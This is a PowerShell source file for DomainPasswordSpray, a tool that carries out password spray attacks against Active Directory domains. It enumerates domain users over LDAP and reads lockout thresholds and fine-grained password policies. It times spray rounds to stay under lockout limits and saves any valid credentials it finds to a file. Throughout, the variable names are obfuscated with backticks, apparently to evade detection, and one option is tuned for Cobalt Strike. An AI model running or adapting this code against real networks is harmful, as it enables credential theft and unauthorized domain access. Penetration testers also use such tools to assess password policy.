function Invoke-DomainPasswordSpray{
    <#
    .SYNOPSIS

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    DomainPasswordSpray Function: Invoke-DomainPasswordSpray
    Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    .PARAMETER UserList

    Optional UserList parameter. This will be generated automatically if not specified.

    .PARAMETER Password

    A single password that will be used to perform the password spray.

    .PARAMETER PasswordList

    A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).

    .PARAMETER OutFile

    A file to output the results to.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER Filter

    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .PARAMETER Force

    Forces the spray to continue and doesn't prompt for confirmation.

    .PARAMETER Fudge

    Extra wait time between each round of tests (seconds).

    .PARAMETER Quiet

    Less output so it will work better with things like Cobalt Strike

    .PARAMETER UsernameAsPassword

    For each user, will try that user's name as their password

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -Password Winter2016

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt

    Description
    -----------
    This command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile valid-creds.txt

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate as each user by using their username as their password. Any valid credentials will be saved to valid-creds.txt

    #>
    param(
     [Parameter(Position = 0, Mandatory = ${Fa`lSe})]
     [string]
     ${U`s`er`LIst} = "",

     [Parameter(Position = 1, Mandatory = ${FA`LSE})]
     [string]
     ${pAS`S`w`OrD},

     [Parameter(Position = 2, Mandatory = ${fA`lSe})]
     [string]
     ${PASsw`OR`d`lIst},

     [Parameter(Position = 3, Mandatory = ${F`ALSE})]
     [string]
     ${oUT`File},

     [Parameter(Position = 4, Mandatory = ${FA`LSE})]
     [string]
     ${F`IL`Ter} = "",

     [Parameter(Position = 5, Mandatory = ${fa`l`se})]
     [string]
     ${D`O`MAIN} = "",

     [Parameter(Position = 6, Mandatory = ${fa`LsE})]
     [switch]
     ${FOr`CE},

     [Parameter(Position = 7, Mandatory = ${f`ALSe})]
     [switch]
     ${usErN`AMEAs`PASS`wO`Rd},

     [Parameter(Position = 8, Mandatory = ${f`A`LsE})]
     [int]
     ${De`laY}=0,

     [Parameter(Position = 9, Mandatory = ${fAL`se})]
     ${jiT`T`eR}=0,

     [Parameter(Position = 10, Mandatory = ${fa`lSE})]
     [switch]
     ${Q`U`IET},

     [Parameter(Position = 11, Mandatory = ${F`ALSE})]
     [int]
     ${f`UDGe}=10
    )

    if (${PA`Ssw`orD})
    {
        ${Pa`Sswo`RDS} = @(${pAsS`WO`Rd})
    }
    elseif(${USERna`MEasPAsS`wo`Rd})
    {
        ${p`ASS`WOrdS} = ""
    }
    elseif(${pas`SW`or`dl`isT})
    {
        ${Pa`ss`W`oRds} = Get-Content ${pas`SwOR`D`LIst}
    }
    else
    {
        Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
        break
    }

    try
    {
        if (${D`O`maIN} -ne "")
        {
            # Using domain specified with -Domain option
            ${d`OM`AiNcon`TexT} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",${d`OmaIN})
            ${D`oMA`INOBj`E`ct} = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${domA`i`NcoNTExt})
            ${CUrrENT`dOM`AIn} = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            ${doM`A`InOBjE`cT} = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            ${CUr`Rent`doma`iN} = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -Domain option."
        break
    }

    if (${UserL`IST} -eq "")
    {
        ${U`SERLISt`Ar`RaY} = Get-DomainUserList -Domain ${dOM`A`IN} -RemoveDisabled -RemovePotentialLockouts -Filter ${f`i`lter}
    }
    else
    {
        # if a Userlist is specified use it and do not check for lockout thresholds
        Write-Host "[*] Using $UserList as userlist to spray with"
        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
        ${u`SErlIS`T`ArRAy} = @()
        try
        {
            ${u`sERlIsT`A`RraY} = Get-Content ${U`Se`RLISt} -ErrorAction stop
        }
        catch [Exception]
        {
            Write-Host -ForegroundColor "red" "$_.Exception"
            break
        }

    }


    if (${P`A`sSwOrDs}.count -gt 1)
    {
        Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
    }

    ${O`BsERVaT`I`on_`W`INdoW} = Get-ObservationWindow ${c`URRe`N`T`DOMAin}

    Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
    Write-Host "[*] Setting a $observation_window minute wait in between sprays."

    # if no force flag is set we will ask if the user is sure they want to spray
    if (!${For`Ce})
    {
        ${TI`TLe} = "Confirm Password Spray"
        ${Me`SsA`Ge} = "Are you sure you want to perform a password spray against " + ${USeRLIs`TAR`RaY}.count + " accounts?"

        ${y`Es} = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

        ${No} = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        ${o`p`TIons} = [System.Management.Automation.Host.ChoiceDescription[]](${Y`Es}, ${nO})

        ${R`eS`Ult} = ${h`OSt}.ui.PromptForChoice(${T`I`TlE}, ${m`ESs`AGe}, ${o`pTi`OnS}, 0)

        if (${R`E`sult} -ne 0)
        {
            Write-Host "Cancelling the password spray."
            break
        }
    }
    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun with " ${p`AS`SWOr`Ds}.count " passwords"
    Write-Host "[*] This might take a while depending on the total number of users"

    if(${U`S`ERname`Asp`AsSWOrD})
    {
        Invoke-SpraySinglePassword -Domain ${Curr`Entdo`Ma`IN} -UserListArray ${USE`RLi`STaRr`AY} -OutFile ${Ou`T`FiLe} -Delay ${Del`AY} -Jitter ${jitT`eR} -UsernameAsPassword -Quiet ${q`UI`ET}
    }
    else
    {
        for(${i} = 0; ${i} -lt ${Pa`sswo`RDs}.count; ${I}++)
        {
            Invoke-SpraySinglePassword -Domain ${cu`RRE`N`TdOMaIn} -UserListArray ${USe`RLIsT`Ar`RaY} -Password ${pASs`W`ORds}[${i}] -OutFile ${o`UTfILE} -Delay ${de`L`AY} -Jitter ${J`ITTeR} -Quiet ${q`UIET}
            if ((${I}+1) -lt ${P`As`swo`RDS}.count)
            {
                Countdown-Timer -Seconds (60*${ObsE`R`VA`Tion_`WiNdoW} + ${F`Ud`GE}) -Quiet ${Q`UIET}
            }
        }
    }

    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
    if (${ou`Tf`ilE} -ne "")
    {
        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
    }
}

function Countdown-Timer
{
    param(
        ${sE`ConDS} = 1800,
        ${m`EsS`AGe} = "[*] Pausing to avoid account lockout.",
        [switch] ${Qu`ieT} = ${f`AL`Se}
    )
    if (${Q`UiEt})
    {
        Write-Host "$Message Waiting for $($Seconds/60) minutes. $($Seconds - $Count)"
        Start-Sleep -Seconds ${sECo`NDS}
    } else {
        foreach (${c`OU`Nt} in (1..${s`Eco`NDS}))
        {
            Write-Progress -Id 1 -Activity ${MeS`s`Age} -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete ((${C`Ount} / ${SE`CO`Nds}) * 100)
            Start-Sleep -Seconds 1
        }
        Write-Progress -Id 1 -Activity ${m`ESSa`gE} -Status "Completed" -PercentComplete 100 -Completed
    }
}

function Get-DomainUserList
{
<#
    .SYNOPSIS

    This module gathers a userlist from the domain.

    DomainPasswordSpray Function: Get-DomainUserList
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module gathers a userlist from the domain.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER RemoveDisabled

    Attempts to remove disabled accounts from the userlist. (Credit to Sally Vandeven (@sallyvdv))

    .PARAMETER RemovePotentialLockouts

    Removes accounts within 1 attempt of locking out.

    .PARAMETER Filter

    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .EXAMPLE

    PS C:\> Get-DomainUserList

    Description
    -----------
    This command will gather a userlist from the domain including all samAccountType "805306368".

    .EXAMPLE

    C:\PS> Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt

    Description
    -----------
    This command will gather a userlist from the domain "domainname" including any accounts that are not disabled and are not close to locking out. It will write them to a file at "userlist.txt"

    #>
    param(
     [Parameter(Position = 0, Mandatory = ${f`AlSe})]
     [string]
     ${dOm`Ain} = "",

     [Parameter(Position = 1, Mandatory = ${FaL`se})]
     [switch]
     ${ReMoveDiSAb`L`ed},

     [Parameter(Position = 2, Mandatory = ${f`AL`se})]
     [switch]
     ${Re`Mo`V`epOt`entiALLOCKoutS},

     [Parameter(Position = 3, Mandatory = ${fa`LSE})]
     [string]
     ${f`Il`Ter}
    )

    try
    {
        if (${Dom`A`iN} -ne "")
        {
            # Using domain specified with -Domain option
            ${DOMai`N`C`ontEXt} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",${d`oMain})
            ${dOma`i`NO`BJE`cT} =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${doMainC`ont`e`xT})
            ${CuRr`e`NT`dO`MAIN} = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            ${domAI`NobJ`eCt} =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            ${CUR`R`enT`Do`MAiN} = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
        break
    }

    # Setting the current domain's account lockout threshold
    ${oBJ`dEdO`MA`in} = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
    ${ACC`OuNtL`oCKOUtTh`Re`SHOl`DS} = @()
    ${ACcO`U`Nt`loCkouTThREShol`DS} += ${OB`Jded`oMaiN}.Properties.lockoutthreshold

    # Getting the AD behavior version to determine if fine-grained password policies are possible
    ${behAV`iorve`R`s`ion} = [int] ${Ob`J`deDom`Ain}.Properties['msds-behavior-version'].item(0)
    if (${BeH`A`ViorVers`IOn} -ge 3)
    {
        # Determine if there are any fine-grained password policies
        Write-Host "[*] Current domain is compatible with Fine-Grained Password Policy."
        ${Ad`Se`Ar`cheR} = New-Object System.DirectoryServices.DirectorySearcher
        ${aDSeARC`h`Er}.SearchRoot = ${OB`J`DeDO`MAIn}
        ${ad`SEa`R`chER}.Filter = "(objectclass=msDS-PasswordSettings)"
        ${P`SOs} = ${A`dsE`ARCHER}.FindAll()

        if ( ${p`SOs}.count -gt 0)
        {
            Write-Host -foregroundcolor "yellow" ("[*] A total of " + ${pS`oS}.count + " Fine-Grained Password policies were found.`r`n")
            foreach(${e`NtRy} in ${pS`OS})
            {
                # Selecting the lockout threshold, min pwd length, and which
                # groups the fine-grained password policy applies to
                ${pS`OFINEGRAin`ED`Po`LiCy} = ${eN`TRy} | Select-Object -ExpandProperty Properties
                ${Ps`O`Po`LicynamE} = ${P`So`F`INEGRAine`dPol`iCY}.name
                ${PsoL`o`CK`OUTtH`R`eSHOlD} = ${pS`Of`INEGraInE`dPO`lIcY}.'msds-lockoutthreshold'
                ${pSoAPP`LiE`sTO} = ${pSoFiNe`GR`AiN`ED`pO`lIcy}.'msds-psoappliesto'
                ${pSoM`InpWDLE`NG`Th} = ${Ps`OfINe`GraI`NE`dPO`LiCy}.'msds-minimumpasswordlength'
                # adding lockout threshold to array for use later to determine which is the lowest.
                ${aCCounT`lO`Cko`U`TTH`RES`HOL`ds} += ${psolOC`K`o`UT`Th`Re`sHoLd}

                Write-Host "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
            }
        }
    }

    ${OBSEr`Va`TI`oN_winDOW} = Get-ObservationWindow ${cuRR`eN`T`DoMa`In}

    # Generate a userlist from the domain
    # Selecting the lowest account lockout threshold in the domain to avoid
    # locking out any accounts.
    [int]${smALlesTl`o`CK`oUtTH`REsHOLD} = ${acco`UNtLoCkoUT`Thr`Esho`LDS} | sort | Select -First 1
    Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."

    if (${SmALLEst`L`OCkou`TT`hReSh`oLd} -eq "0")
    {
        Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
    }
    else
    {
        Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
    }

    ${US`ErSEarC`Her} = New-Object System.DirectoryServices.DirectorySearcher([ADSI]${c`U`RrenTDOmA`iN})
    ${d`IR`ENT`Ry} = New-Object System.DirectoryServices.DirectoryEntry
    ${USE`RsEArC`h`ER}.SearchRoot = ${d`Iren`TrY}

    ${usEr`s`EARCH`Er}.PropertiesToLoad.Add("samaccountname") > ${NU`LL}
    ${uSErSE`A`RCh`ER}.PropertiesToLoad.Add("badpwdcount") > ${n`ULL}
    ${u`seRs`EarCH`er}.PropertiesToLoad.Add("badpasswordtime") > ${n`Ull}

    if (${remoV`edi`SAbL`ED})
    {
        Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
        # More precise LDAP filter UAC check for users that are disabled (Joff Thyer)
        # LDAP 1.2.840.113556.1.4.803 means bitwise &
        # uac 0x2 is ACCOUNTDISABLE
        # uac 0x10 is LOCKOUT
        # See http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
        ${US`e`RsE`AR`chER}.filter =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$Filter)"
    }
    else
    {
        ${uS`ErsEar`c`Her}.filter = "(&(objectCategory=person)(objectClass=user)$Filter)"
    }

    ${uSeRsEar`C`h`er}.PropertiesToLoad.add("samaccountname") > ${nu`lL}
    ${U`serSe`ArcH`Er}.PropertiesToLoad.add("lockouttime") > ${nU`lL}
    ${us`erseAr`c`hEr}.PropertiesToLoad.add("badpwdcount") > ${nU`ll}
    ${u`SERSe`ArC`heR}.PropertiesToLoad.add("badpasswordtime") > ${nU`LL}

    #Write-Host $UserSearcher.filter

    # grab batches of 1000 in results
    ${us`ERSE`ARcH`Er}.PageSize = 1000
    ${alLusE`R`ObJE`C`TS} = ${U`SERsEA`RcHEr}.FindAll()
    Write-Host -ForegroundColor "yellow" ("[*] There are " + ${A`LLUSERo`B`JeCts}.count + " total users found.")
    ${useR`LiS`T`A`RraY} = @()

    if (${remoVePot`Enti`ALl`oc`kOutS})
    {
        Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
        foreach (${u`SER} in ${aLluSerO`Bj`e`CTs})
        {
            # Getting bad password counts and lst bad password time for each user
            ${bAD`CO`UNT} = ${US`er}.Properties.badpwdcount
            ${samaC`C`OU`N`TName} = ${uS`eR}.Properties.samaccountname
            try
            {
                ${BADPasSWo`R`d`TimE} = ${US`Er}.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            ${Cu`RRe`Nt`Time} = Get-Date
            ${l`As`T`Badpwd} = [DateTime]::FromFileTime(${B`Adp`AsswORdTi`me})
            ${TiMedIff`e`RE`NCe} = (${c`U`Rrent`TImE} - ${LaSTB`A`DPWD}).TotalMinutes

            if (${b`ADcOUnt})
            {
                [int]${u`SerBa`dC`oU`Nt} = [convert]::ToInt32(${B`Adc`OUNT}, 10)
                ${Att`eM`PtS`UntIllOcKOUt} = ${SMallEStlOc`K`O`UTthresH`Old} - ${u`SErbAd`CounT}
                # if there is more than 1 attempt left before a user locks out
                # or if the time since the last failed login is greater than the domain
                # observation window add user to spray list
                if ((${timeDI`FF`Er`e`NCe} -gt ${ob`sErva`T`iON_`wiN`dOW}) -or (${AttE`mpt`s`U`Ntil`Loc`KOut} -gt 1))
                                {
                    ${US`ERl`iS`TarrAy} += ${s`AMaccOuNtn`A`Me}
                }
            }
        }
    }
    else
    {
        foreach (${u`SEr} in ${alL`USE`Ro`BJECts})
        {
            ${SAMaC`C`OuN`T`Name} = ${us`ER}.Properties.samaccountname
            ${uS`ERLI`s`TARray} += ${s`AM`ACCOu`NTnamE}
        }
    }

    Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + ${Us`eR`li`St`ARray}.count + " users gathered from the current user's domain")
    return ${uSE`RlI`st`ARRAY}
}

function Invoke-SpraySinglePassword
{
    param(
            [Parameter(Position=1)]
            ${dom`A`In},
            [Parameter(Position=2)]
            [string[]]
            ${US`erLiStA`RRAy},
            [Parameter(Position=3)]
            [string]
            ${p`A`SsW`OrD},
            [Parameter(Position=4)]
            [string]
            ${oU`T`FILE},
            [Parameter(Position=5)]
            [int]
            ${dE`l`AY}=0,
            [Parameter(Position=6)]
            [double]
            ${J`ITt`ER}=0,
            [Parameter(Position=7)]
            [switch]
            ${uSeR`NAMeas`pA`sSwoRd},
            [Parameter(Position=7)]
            [switch]
            ${Q`UIeT}
    )
    ${tI`ME} = Get-Date
    ${c`OuNT} = ${us`eR`ListArraY}.count
    Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
    ${cuRR_`U`SeR} = 0
    if (${o`Ut`FiLe} -ne ""-and -not ${qU`i`et})
    {
        Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"    
    }
    ${ran`D`NO} = New-Object System.Random

    foreach (${Us`er} in ${USe`RL`IsTa`RrAY})
    {
        if (${U`Se`RNAMEAspASSw`ORD})
        {
            ${pass`w`ORD} = ${US`er}
        }
        ${Do`MA`In_c`hecK} = New-Object System.DirectoryServices.DirectoryEntry(${Dom`A`In},${uS`er},${pA`SsWo`Rd})
        if (${DO`m`AIn_cHeCk}.name -ne ${NU`Ll})
        {
            if (${O`Utfile} -ne "")
            {
                Add-Content ${ou`TF`ILE} $User`:$Password
            }
            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
        }
        ${c`URR_u`S`ER} += 1
        if (-not ${QUi`eT})
        {
            Write-Host -nonewline "$curr_user of $count users tested`r"
        }
        if (${d`e`LaY})
        {
            Start-Sleep -Seconds ${r`ANd`No}.Next((1-${J`i`TTEr})*${d`elaY}, (1+${j`ITTeR})*${d`ElaY})
        }
    }

}

function Get-ObservationWindow(${doM`AInen`T`RY})
{
    # Get account lockout observation window to avoid running more than 1
    # password spray per observation window.
    ${L`OcKOb`Se`R`Vat`ioNwINDoW_ATtr} = ${d`OMA`iNEn`Try}.Properties['lockoutObservationWindow']
    ${oBS`erva`T`ION_`winDOW} = ${dOma`i`NE`Ntry}.ConvertLargeIntegerToInt64(${l`OcKo`BS`ERvAtiONwINdOw`_a`TTR}.Value) / -600000000
    return ${oB`s`eRV`AtIoN_windOW}
}
